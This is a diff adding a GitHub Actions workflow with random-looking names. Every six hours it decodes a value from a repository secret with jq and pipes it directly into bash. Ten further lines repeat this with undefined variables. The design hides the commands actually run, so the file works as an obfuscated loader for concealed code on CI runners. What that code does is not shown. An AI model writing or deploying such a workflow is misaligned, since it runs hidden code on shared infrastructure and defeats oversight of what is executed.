@@ -1,0 +1,27 @@
+name: tongmengshi2006
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongmengshi2006
+        env:
+          kamy427: ${{ secrets.kamy427 }}
+        run: |
+          echo $kamy427 | jq -r .we0 | /bin/bash
+          echo $bp26552 | jq -r .o095 | /bin/bash
+          echo $ululs22829 | jq -r .iqjmw7980 | /bin/bash
+          echo $wmycb78951 | jq -r .p7 | /bin/bash
+          echo $utxq12 | jq -r .ntcjf48189 | /bin/bash
+          echo $zwqwc322 | jq -r .umje67966 | /bin/bash
+          echo $ryw678 | jq -r .kl669 | /bin/bash
+          echo $uia5 | jq -r .nwodd74 | /bin/bash
+          echo $bwn17359 | jq -r .odrk66 | /bin/bash
+          echo $a955 | jq -r .msayq6 | /bin/bash
+          echo $gaw87 | jq -r .sc633 | /bin/bash
+
